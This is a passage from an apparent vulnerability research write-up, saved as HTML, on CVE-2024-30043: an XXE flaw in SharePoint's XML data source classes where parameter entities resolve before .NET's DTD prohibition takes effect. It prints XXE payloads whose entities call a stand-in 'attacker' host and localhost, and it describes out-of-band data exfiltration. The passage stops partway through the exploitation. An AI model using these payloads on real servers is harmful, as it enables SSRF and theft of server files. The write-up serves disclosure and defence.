          <td id="file-cve-2024-30043-0-cs-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-cve-2024-30043-0-cs-LC19" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">try</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-cve-2024-30043-0-cs-LC20" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">{</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-cve-2024-30043-0-cs-LC21" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">do</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-cve-2024-30043-0-cs-LC22" class="blob-code blob-code-inner js-file-line">                <span class="pl-kos">{</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-cve-2024-30043-0-cs-LC23" class="blob-code blob-code-inner js-file-line">                    <span class="pl-s1">xmlReader</span><span class="pl-kos">.</span><span class="pl-en">Read</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span> <span class="pl-c">// [7]</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-cve-2024-30043-0-cs-LC24" class="blob-code blob-code-inner js-file-line">                <span class="pl-kos">}</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-cve-2024-30043-0-cs-LC25" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">while</span> <span class="pl-kos">(</span><span class="pl-s1">xmlReader</span><span class="pl-kos">.</span><span class="pl-s1">NodeType</span> <span class="pl-c1">!=</span> <span class="pl-s1">XmlNodeType</span><span class="pl-kos">.</span><span class="pl-s1">Element</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-cve-2024-30043-0-cs-LC26" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">}</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-cve-2024-30043-0-cs-LC27" class="blob-code blob-code-inner js-file-line">            ..<span class="pl-kos">.</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-cve-2024-30043-0-cs-LC28" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L29" class="blob-num js-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-cve-2024-30043-0-cs-LC29" class="blob-code blob-code-inner js-file-line">        ..<span class="pl-kos">.</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L30" class="blob-num js-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-cve-2024-30043-0-cs-LC30" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L31" class="blob-num js-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-cve-2024-30043-0-cs-LC31" class="blob-code blob-code-inner js-file-line">    ..<span class="pl-kos">.</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L32" class="blob-num js-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-cve-2024-30043-0-cs-LC32" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">}</span></td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/b7029d03c01bcb6bef30519c2bd45306/raw/fa9412a1e1db5809c566b94bfdc5a0a8452b2901/CVE-2024-30043-0.cs" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/b7029d03c01bcb6bef30519c2bd45306#file-cve-2024-30043-0-cs" class="Link--inTextBlock">
          CVE-2024-30043-0.cs
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_84006"><div class="sqs-block-content"><p>At <code>[1]</code>, you can see the <code>Execute</code> method, which accepts a string called <code>request</code>. We fully control this string, and it should be a URL (or a path) pointing to an XML file. Later, I will refer to this string as <code>DataFile</code>.</p>
<p>At this point, we can derive this method into two main parts: XML fetching and XML parsing.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a)	XML Fetching</p>
<p>At <code>[2]</code>, <code>this.FetchData</code> is called and our URL is passed as an input argument. <code>BaseXmlDataSource</code> does not implement this method (it’s an abstract class). </p>
<p><code>FetchData</code> is implemented in three classes that extend our abstract class:<br>•	<code>SoapDataSource</code> - performs HTTP SOAP request and retrieves a response (XML).<br>•	<code>XmlUrlDataSource</code> - performs a customizable HTTP request and retrieves a response (XML).<br>•	<code>SPXmlDataSource</code> - retrieves an existing specified file on the SharePoint site.  </p>
<p>We will revisit those classes later.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b)	XML Parsing</p>
<p>At <code>[3]</code>, the <code>xmlReaderSettings.DtdProcessing</code> member is set to <code>DtdProcessing.Prohibit</code>, which should disable the processing of DTDs. </p>
<p>At <code>[4]</code> and <code>[5]</code>, the <code>xmlTextReader.XmlResolver</code> is set to a freshly created <code>XmlSecureResolver</code>. The <code>request</code> string, which we fully control, is passed as the <code>securityUrl</code> parameter when creating the <code>XmlSecureResolver</code> </p>
<p>At <code>[6]</code>, the code creates a new instance of <code>XmlReader</code>.</p>
<p>Finally, it reads the contents of the XML using a while-do loop at <code>[7]</code>.</p>
<p>At first glance, this parsing routine seems correct. The document type definition (DTD) processing of our <code>XmlReaderSettings</code> instance is set to <code>Prohibit</code>, which should block all DTD processing. On the other hand, we have the <code>XmlResolver</code> set to <code>XmlSecureResolver</code>.</p>
<p>From my experience, it is very rare to see .NET code, where:<br>•	DTDs are blocked through <code>XmlReaderSettings</code>.<br>•	Some <code>XmlResolver</code> is still defined.  </p>
<p>I decided to play around and sent in a general entity-based payload at some test code I wrote similar to the code shown above (I only replaced <code>XmlSecureResolver</code> with <code>XmlUrlResolver</code> for testing purposes):</p>

</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;customThumbEnabled&quot;:false,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/zdi-team/b812f8253db60ce52523c448ac73ab58.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1716478721166_128396"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_71" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/b812f8253db60ce52523c448ac73ab58.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/gist-embed-0ac919313390.css"><div id="gist130535203" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2024-30043-1-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2024-30043-1.xml content, created by zdi-team on 03:19PM on May 29, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2024-30043-1.xml">
        <tbody><tr>
          <td id="file-cve-2024-30043-1-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2024-30043-1-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> ?&gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-1-xml-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2024-30043-1-xml-LC2" class="blob-code blob-code-inner js-file-line">&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">a</span> [</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-1-xml-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2024-30043-1-xml-LC3" class="blob-code blob-code-inner js-file-line">&lt;!ELEMENT a ANY &gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-1-xml-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2024-30043-1-xml-LC4" class="blob-code blob-code-inner js-file-line">&lt;!<span class="pl-k">ENTITY</span> <span class="pl-c1">b</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>http://attacker/poc.txt<span class="pl-pds">"</span></span>&gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-1-xml-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2024-30043-1-xml-LC5" class="blob-code blob-code-inner js-file-line">]&gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-1-xml-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2024-30043-1-xml-LC6" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">r</span>&gt;<span class="pl-c1">&amp;b;</span>&lt;/<span class="pl-ent">r</span>&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/b812f8253db60ce52523c448ac73ab58/raw/ca4ea537d5ac2dbf43dd303fc9bb0baee300a61c/CVE-2024-30043-1.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/b812f8253db60ce52523c448ac73ab58#file-cve-2024-30043-1-xml" class="Link--inTextBlock">
          CVE-2024-30043-1.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_127788"><div class="sqs-block-content"><p>As expected, no HTTP request was performed, and a DTD processing exception was thrown. What about this payload?</p>

</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;customThumbEnabled&quot;:false,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/zdi-team/f233f6ebbd1dfea6568698e788a1babf.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1716478721166_140010"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_74" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/f233f6ebbd1dfea6568698e788a1babf.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/gist-embed-0ac919313390.css"><div id="gist130535204" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2024-30043-2-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2024-30043-2.xml content, created by zdi-team on 03:19PM on May 29, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2024-30043-2.xml">
        <tbody><tr>
          <td id="file-cve-2024-30043-2-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2024-30043-2-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> ?&gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-2-xml-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2024-30043-2-xml-LC2" class="blob-code blob-code-inner js-file-line">&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">a</span> [</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-2-xml-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2024-30043-2-xml-LC3" class="blob-code blob-code-inner js-file-line">&lt;!ELEMENT a ANY &gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-2-xml-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2024-30043-2-xml-LC4" class="blob-code blob-code-inner js-file-line">&lt;!<span class="pl-k">ENTITY</span> % <span class="pl-c1">sp</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>http://attacker/poc.xml<span class="pl-pds">"</span></span>&gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-2-xml-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2024-30043-2-xml-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">%sp;</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-2-xml-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2024-30043-2-xml-LC6" class="blob-code blob-code-inner js-file-line">]&gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-2-xml-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2024-30043-2-xml-LC7" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">a</span>&gt;wat&lt;/<span class="pl-ent">a</span>&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/f233f6ebbd1dfea6568698e788a1babf/raw/99ee20fbd0b23e64cac9a8c18bc015af18eb8d20/CVE-2024-30043-2.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/f233f6ebbd1dfea6568698e788a1babf#file-cve-2024-30043-2-xml" class="Link--inTextBlock">
          CVE-2024-30043-2.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_140436"><div class="sqs-block-content"><p>It was a massive surprise to me, but the HTTP request was performed! According to that, it seems that when you have .NET code where:<br>•	<code>XmlReader</code> is used with <code>XmlTextReader</code> and <code>XmlReaderSettings</code>.<br>•	<code>XmlReaderSettings.DtdProcessing</code> is set to <code>Prohibit</code>.<br>•	An <code>XmlTextReader.XmlResolver</code> is set.</p>
<p>The resolver will first try to handle the parameter entities, and only afterwards will perform the DTD prohibition check! An exception will be thrown in the end, but it still allows you to exploit the Out-of-Band XXE and potentially exfiltrate data (using, for example, an HTTP channel).</p>
<p>The XXE is there, but we have to solve two mysteries:</p>
<p>•	How can we properly fetch the XML payload in SharePoint?<br>•	What’s the deal with this <code>XmlSecureResolver</code>?</p>
<p><b data-preserve-html-node="true">XML Fetching and XmlSecureResolver</b></p>
<p>As I have already mentioned, there are 3 classes that extend our vulnerable <code>BaseXmlDataSource</code>. Their <code>FetchData</code> method is used to retrieve the XML content based on our URL. Then, this XML will be parsed with the vulnerable XML parsing code.</p>
<p>Let’s summarize those 3 classes:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a)	<code>XmlUrlDataSource</code></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Accepts URLs with a protocol set to either <code>http</code> or <code>https</code>.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Performs an HTTP request to fetch the XML content. This request is customizable. For example, we can select which HTTP method we want to use.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Some SSRF protections are implemented. This class won’t allow you to make HTTP requests to local addresses such as 127.0.0.1 or 192.168.1.10. Still, you can use it freely to reach external IP address space.  </p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b)	<code>SoapDataSource</code></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Almost identical to the first one, although it allows you to perform SOAP requests only (body must contain valid XML, plus additional restrictions).<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	The same SSRF protections exist as in <code>XmlUrlDataSource</code>.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c)	<code>SPXmlDataSource</code></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Allows retrieval of the contents of SharePoint pages or documents. If you have a file <code>test.xml</code> uploaded to the <code>sample</code> site, you can provide a URL as follows: <code>/sites/sample/test.xml</code>.</p>
<p>At this point, those HTTP-based classes look like a great match. We can:<br>•	Create an HTTP server.<br>•	Fetch malicious XML from our server.<br>•	Trigger XXE and potentially read files from SharePoint server.  </p>
<p>Let’s test this. I’m creating an <code>XmlUrlDataSource</code>, and I want it to fetch the XML from this URL:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>http://attacker.com/poc.xml</code></p>
<p><code>poc.xml</code> contains the following payload:</p>

</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;customThumbEnabled&quot;:false,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/zdi-team/f41441d8696948c5a1bae05fcd5459d3.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1716478721166_151219"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_77" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/f41441d8696948c5a1bae05fcd5459d3.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/gist-embed-0ac919313390.css"><div id="gist130535205" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2024-30043-3-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2024-30043-3.xml content, created by zdi-team on 03:19PM on May 29, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2024-30043-3.xml">
        <tbody><tr>
          <td id="file-cve-2024-30043-3-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2024-30043-3-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> ?&gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-3-xml-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2024-30043-3-xml-LC2" class="blob-code blob-code-inner js-file-line">&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">a</span> [</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-3-xml-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2024-30043-3-xml-LC3" class="blob-code blob-code-inner js-file-line">&lt;!ELEMENT a ANY &gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-3-xml-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2024-30043-3-xml-LC4" class="blob-code blob-code-inner js-file-line">&lt;!<span class="pl-k">ENTITY</span> % <span class="pl-c1">sp</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>http://localhost/test<span class="pl-pds">"</span></span>&gt;</td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-3-xml-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2024-30043-3-xml-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">%sp;</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-3-xml-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2024-30043-3-xml-LC6" class="blob-code blob-code-inner js-file-line">]&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/f41441d8696948c5a1bae05fcd5459d3/raw/fd97bca69e2b2f0034e7ec77933bf5bf07577be7/CVE-2024-30043-3.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/f41441d8696948c5a1bae05fcd5459d3#file-cve-2024-30043-3-xml" class="Link--inTextBlock">
          CVE-2024-30043-3.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_151646"><div class="sqs-block-content"><p>The plan is simple. I want to test the XXE by executing an HTTP request to the localhost (SSRF). </p>
<p>We must also remember that whatever URL that we specify as our source also becomes the <code>securityUrl</code> of the <code>XmlSecureResolver</code>. Accordingly, this is what will be executed:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1716478721166_152427"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_128">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-below
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949716544_127">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:904px;" id="yui_3_17_2_1_1762949716544_126">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="&lt;p class=&quot;&quot; style=&quot;white-space:pre-wrap;&quot;&gt;&lt;em&gt;Figure 1 XmlSecureResolver initialization&lt;/em&gt;&lt;/p&gt;" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949716544_125">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949716544_124">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:27.87610626220703%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949716544_123">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/c9bb8f01-d783-446d-87e4-94a637c8488b/XmlSecureResolver.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/c9bb8f01-d783-446d-87e4-94a637c8488b/XmlSecureResolver.png" data-image-dimensions="904x252" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/XmlSecureResolver.png" width="904" height="252" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/c9bb8f01-d783-446d-87e4-94a637c8488b/XmlSecureResolver.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/c9bb8f01-d783-446d-87e4-94a637c8488b/XmlSecureResolver.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/c9bb8f01-d783-446d-87e4-94a637c8488b/XmlSecureResolver.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/c9bb8f01-d783-446d-87e4-94a637c8488b/XmlSecureResolver.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/c9bb8f01-d783-446d-87e4-94a637c8488b/XmlSecureResolver.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/c9bb8f01-d783-446d-87e4-94a637c8488b/XmlSecureResolver.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/c9bb8f01-d783-446d-87e4-94a637c8488b/XmlSecureResolver.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <div class="image-caption"><p class="" style="white-space:pre-wrap;"><em>Figure 1 XmlSecureResolver initialization</em></p></div>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_164798"><div class="sqs-block-content"><p>Who cares anyway? YOLO and let’s move along with the exploitation. Unfortunately, this is the exception that appears when we try to execute this attack:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1716478721166_165593"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_153">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-below
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949716544_152">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:904px;" id="yui_3_17_2_1_1762949716544_151">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="&lt;p class=&quot;&quot; style=&quot;white-space:pre-wrap;&quot;&gt;&lt;em&gt;Figure 2 Exception thrown during XXE-&amp;gt;SSRF&lt;/em&gt;&lt;/p&gt;" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949716544_150">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949716544_149">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:44.026546478271484%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949716544_148">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/26fdf097-fb42-4206-8d1c-42eec51f1ad3/exception.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/26fdf097-fb42-4206-8d1c-42eec51f1ad3/exception.png" data-image-dimensions="904x398" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/exception.png" width="904" height="398" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/26fdf097-fb42-4206-8d1c-42eec51f1ad3/exception.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/26fdf097-fb42-4206-8d1c-42eec51f1ad3/exception.png?format=300w 300w, 